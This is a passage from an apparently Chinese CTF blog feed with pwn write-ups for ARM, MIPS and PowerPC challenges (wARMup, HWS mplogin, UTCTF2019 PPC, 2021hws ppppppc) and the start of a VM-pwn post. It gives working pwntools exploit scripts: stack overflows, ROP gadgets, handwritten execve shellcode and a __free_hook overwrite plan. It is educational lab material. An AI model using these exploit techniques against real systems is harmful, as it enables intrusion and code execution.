BL      read</span><br></pre></td></tr></table></figure><p>由R3决定第二个参数,恰好程序中存在这样一条gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.fini:000105C0 08 80 BD E8                   POP     &#123;R3,PC&#125;  </span><br></pre></td></tr></table></figure><p>于是我们可以直接在bss段上写shellcode并执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./wARMup&#x27;</span></span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf&#x27;,&#x27;./wARMup&#x27;])</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./wARMup&#x27;</span>])</span><br><span class="line"></span><br><span class="line">read=<span class="number">0x10530</span></span><br><span class="line">bss=<span class="number">0x21034</span></span><br><span class="line">pop_r3_pc=<span class="number">0x10364</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+p32(bss+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_r3_pc)+p32(bss)+p32(read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.send(p32(bss)+p32(bss+<span class="number">8</span>)+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里有一个比较奇怪的点是,如果在调试模式下read的第二参数必须是bss+4才能正常写入到bss处起始</p><p>但直接执行模式下,又必须是bss</p><h1 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h1><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>mips下的利用需要注意几点</p><ol><li>MIPS32 架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈</li><li>传参过程中，前四个参数a0−a3，多余的会保存在调用函数的预留的栈顶空间内</li><li>MIPS 调用函数时会把函数的返回地址直接存入 $RA 寄存器</li><li>MIPS的特殊性，在函数体中<code>$fp</code>和 <code>$sp</code>是相同的，即都指向栈顶</li><li>由于mips的特殊性,在<strong>ROP过程中非常容易搞出来类似在x86上的<code>jmp esp</code>的指令</strong></li><li>mips本身不支持NX,与arm是因为qemu的关系不同</li></ol><p>最后两条使得ret2shellcode是十分有效的攻击方式</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="HWS入营赛题mplogin"><a href="#HWS入营赛题mplogin" class="headerlink" title="HWS入营赛题mplogin"></a>HWS入营赛题mplogin</h3><p>checksec没有任何保护机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/Mplogin/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>在sub_400840函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400840</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果v1的长度填满的话那么%s就会把后面的栈地址一起打印出来</p><p>此时就可以泄露栈了</p><p>然后在sub_400978函数中</p><p>存在溢出,覆盖返回地址为栈,ret2shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./Mplogin&#x27;</span></span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-mipsel&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/home/aichch/pwn/Mplogin&#x27;,&#x27;./Mplogin&#x27;])</span></span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-mipsel&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/aichch/pwn/Mplogin&#x27;</span>,<span class="string">&#x27;./Mplogin&#x27;</span>])</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Pre_Password : &quot;</span>,<span class="string">b&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">b&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line">p.sendafter(<span class="string">b&quot;Password : &quot;</span>,<span class="string">b&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">b&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="HWS结营赛题pwn"><a href="#HWS结营赛题pwn" class="headerlink" title="HWS结营赛题pwn"></a>HWS结营赛题pwn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line">➜  checksec pwn</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>MIPS大端，静态链接</p><p>因为这里没有地方泄露栈的地址，所以只能使用ROP来构造类似<code>jmp esp</code>的指令</p><p>在0x004273C4处有一条gadget</p><p><code>addiu $a2,$sp,0x64;  jalr $s0</code></p><p>这个gadget会将$sp寄存器的值加上0x64放到$a2寄存器中，然后跳转到$s0寄存器中的地址去执行。那么如果我们能控制$s0寄存器的值指向一个跳转$a2的gadget,然后在<code>$sp+0x64</code>栈地址上布置shellcode即可利用成功。于是我们需要完成以下操作：</p><ol><li>找到能跳转到$a2的gadget</li><li>控制$s0寄存器到如上gadget</li><li>在<code>$sp+0x64</code>的栈地址上布置shellcode</li></ol><p>可以找到：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Address</th><th style="text-align:left">Action</th><th style="text-align:left">Control Jump</th></tr></thead><tbody><tr><td style="text-align:left">0x00421684</td><td style="text-align:left">move $t9,$a2</td><td style="text-align:left">jr $a2</td></tr></tbody></table></div><p>现在还需要解决一个问题,如何控制$s0？</p><p>这个在前文的MIPS基础知识中提到过，在MIPS的复杂函数的序言和尾声中，会保存和恢复s组寄存器，我们可以下<code>pwn()</code>函数尾声的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A2C                 move    $sp, $fp</span><br><span class="line">.text:00400A30                 lw      $ra, 0x7C($sp)</span><br><span class="line">.text:00400A34                 lw      $fp, 0x78($sp)</span><br><span class="line">.text:00400A38                 lw      $s7, 0x74($sp)</span><br><span class="line">.text:00400A3C                 lw      $s6, 0x70($sp)</span><br><span class="line">.text:00400A40                 lw      $s5, 0x6C($sp)</span><br><span class="line">.text:00400A44                 lw      $s4, 0x68($sp)</span><br><span class="line">.text:00400A48                 lw      $s3, 0x64($sp)</span><br><span class="line">.text:00400A4C                 lw      $s2, 0x60($sp)</span><br><span class="line">.text:00400A50                 lw      $s1, 0x5C($sp)</span><br><span class="line">.text:00400A54                 lw      $s0, 0x58($sp)</span><br><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br><span class="line">.text:00400A5C                 jr      $ra</span><br><span class="line">.text:00400A60                 nop</span><br></pre></td></tr></table></figure><p>故我们之前溢出时，在<code>0x90</code>控制了<code>$ra</code>，则我们在<code>0x90-0x7c+0x58=0x6c</code>处，即可控制<code>$s0</code></p><h4 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h4><p>因为在函数的尾声处会把栈空间收回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br></pre></td></tr></table></figure><p>故我们控制栈地址到$s2寄存器的值也是回收之后的栈空间，故这个栈空间就是溢出返回地址之后的栈空间，故我们的gadget是<code>$sp+0x64</code>，直接在溢出点后的0x64位置处拼接shellcode即可，故完整exp如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span> <span class="comment"># move sp+0x64 to a2 -&gt; jmp s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment"># jmp a2                   </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1:&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(s0) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(ra)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><h3 id="UTCTF2019-PPC"><a href="#UTCTF2019-PPC" class="headerlink" title="UTCTF2019 PPC"></a>UTCTF2019 PPC</h3><p>查看基本信息,发现程序是静态编译且没有任何保护机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+60h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+64h] [-1Ch]</span></span><br><span class="line"></span><br><span class="line">  welcome_0();</span><br><span class="line">  get_input_0();</span><br><span class="line">  v5 = strlen_0(buf_0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    buf_0[i] ^= <span class="number">0xCB</span>u;</span><br><span class="line">  printf_0(<span class="string">&quot;%d\n&quot;</span>, v5);</span><br><span class="line">  encrypt_0((<span class="type">char</span> *)v5, v3);</span><br><span class="line">  puts_0(<span class="string">&quot;Exiting..&quot;</span>);</span><br><span class="line">  exit_0(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_input向bss段上的全局变量buf读取1000个字节</p><p>前面都没有漏洞点,但在encrypt函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encrypt_0</span><span class="params">(<span class="type">char</span> *block, <span class="type">int</span> edflag)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v2[<span class="number">2</span>]; <span class="comment">// [sp+60h] [-90h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">32</span>]; <span class="comment">// [sp+68h] [-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">26</span>] = (_DWORD)block;</span><br><span class="line">  memcpy_0(v3, buf_0, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  printf_0(<span class="string">&quot;Here&#x27;s your string: &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( v2[<span class="number">0</span>] = <span class="number">0</span>; v2[<span class="number">0</span>] &lt;= <span class="number">49</span>; ++v2[<span class="number">0</span>] )</span><br><span class="line">    printf_0(<span class="string">&quot;%x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;v2[<span class="number">2</span>] + v2[<span class="number">0</span>]));</span><br><span class="line">  putchar_0(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从buf处赋值内存到栈上上,显然发生溢出</p><p>因为没有开启nx,因此直接在buf上写入shellcode,查找溢出长度后直接返回到buf处</p><p>另外为了绕过异或检测,可以shellcode之前填上几个’\0’截断strlen函数</p><p>由于ppc结构没有类似push,pop的操作,所有栈都是由编译器直接指定,所以没办法直接生成getshell的shellcode,需要自己写</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;ppc&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span>+target)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor 3,3,3   </span></span><br><span class="line"><span class="string">lis 3, 0x100d  </span></span><br><span class="line"><span class="string">addi 3, 3, 0x2b64</span></span><br><span class="line"><span class="string">xor 4,4,4</span></span><br><span class="line"><span class="string">xor 5,5,5</span></span><br><span class="line"><span class="string">li 0, 11</span></span><br><span class="line"><span class="string">sc</span></span><br><span class="line"><span class="string">.long 0x6e69622f</span></span><br><span class="line"><span class="string">.long 0x68732f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>) + shellcode</span><br><span class="line">rop = rop.ljust(<span class="number">152</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">rop += p64(<span class="number">0x100D2B40</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;string\n&#x27;</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2021hws-ppppppc"><a href="#2021hws-ppppppc" class="headerlink" title="2021hws-ppppppc"></a>2021hws-ppppppc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/PPPPPPC&#x27;</span><br><span class="line">    Arch:     powerpc-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>静态编译无任何保护</p><p>去除了符号表,不过可以根据字符串查找到main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_10000464</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">308</span>]; <span class="comment">// [sp+8h] [-138h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_100003FC();</span><br><span class="line">  sub_100095B0(<span class="string">&quot;Hello, welcome to hws!&quot;</span>);</span><br><span class="line">  sub_100082D0(<span class="string">&quot;Tell me your name: &quot;</span>);</span><br><span class="line">  sub_10008F40(v1, <span class="number">800</span>, off_100A0E00);</span><br><span class="line">  sub_1001B9B0(&amp;unk_100B3390, v1);</span><br><span class="line">  sub_100095B0(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现就是就是栈溢出漏洞</p><p>远程环境一定是qemu，直接ret2shellcode,搜索内存发现两段内存里存着发过去的数据，注意要用栈上的shellcode，拷贝到数据段的shellcode会被截断。</p><p>当内存错误时,会打印当前状态,其中包含栈信息,由于是qemu，所以每次不变，故泄露一次，下一次攻击用即可</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;powerpc&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PPPPPPC&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=process([<span class="string">&quot;./qemu-ppc-static&quot;</span>,<span class="string">&quot;./PPPPPPC&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Tell me your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor 3, 3, 3</span></span><br><span class="line"><span class="string">xor 4, 4, 4</span></span><br><span class="line"><span class="string">xor 5, 5, 5</span></span><br><span class="line"><span class="string">li 0, 11</span></span><br><span class="line"><span class="string">mflr r3</span></span><br><span class="line"><span class="string">addi r3, r3, 7*4</span></span><br><span class="line"><span class="string">sc</span></span><br><span class="line"><span class="string">.long 0x2f62696e</span></span><br><span class="line"><span class="string">.long 0x2f736800</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">r.sendline(sc.ljust(<span class="number">0x13c</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p32(<span class="number">0xf6ffeea0</span>))</span><br><span class="line"><span class="comment"># 0xf6ffed38</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="risc-v"><a href="#risc-v" class="headerlink" title="risc-v"></a>risc-v</h1>]]></content>
    
    
    <summary type="html">异构</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VMpwn</title>
    <link href="https://ixout.github.io/posts/43000/"/>
    <id>https://ixout.github.io/posts/43000/</id>
    <published>2023-11-04T14:03:40.000Z</published>
    <updated>2023-11-04T14:14:25.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h1><p>VM Pwn就是题目自定义了一套指令系统，并且模拟了一套CPU的环境（寄存器、栈、数据缓冲区等结构）需要通过逆向分析题目给定的指令系统,并利用其中的漏洞进行攻击</p><p>大部分漏洞都是<strong><u>数组越界</u></strong>!!</p><p>分析的时候要结合全局分析,先把总体架构搞清楚,如果只看部分很容易懵逼</p><h2 id="OVM"><a href="#OVM" class="headerlink" title="OVM"></a>OVM</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>比较入门的一道vm类题目了</p><p>通过一个数组模拟寄存器</p><p>程序实现了加减乘除左移右移压栈弹栈等操作</p><p>可以自己输入指令起始地址,指令数,栈起始等</p><p>程序的指令都是四字节的</p><p>字节从高到低分别是:指令码,左操作数,右操作数1,右操作数2</p><p>循环主体,不断取出指令下标并判断执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( running )</span><br><span class="line"> &#123;</span><br><span class="line">   v7 = fetch();</span><br><span class="line">   execute(v7);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>利用的漏洞自然是指令没有对下标进行检查,能够覆写很多地方</p><p>在接收到结束指令后会打印所有寄存器的值,此时可以进行泄露</p><p>由于开启了FULL RELRO,因此选择覆写__free_hook</p><p>具体的利用步骤:</p><ol><li>将got表中存储的libc相关地址分块存储到寄存器中,建议泄露stdin三个,距离__free_hook比较近</li><li>通过got表计算得到__free_hook-8的地址(不同libc不同偏移,要根据gdb调试判断)</li><li>覆写comment指针为__free_hook-8</li><li>向comment指针写入binsh字符串,并覆写__free_hook为system的地址</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 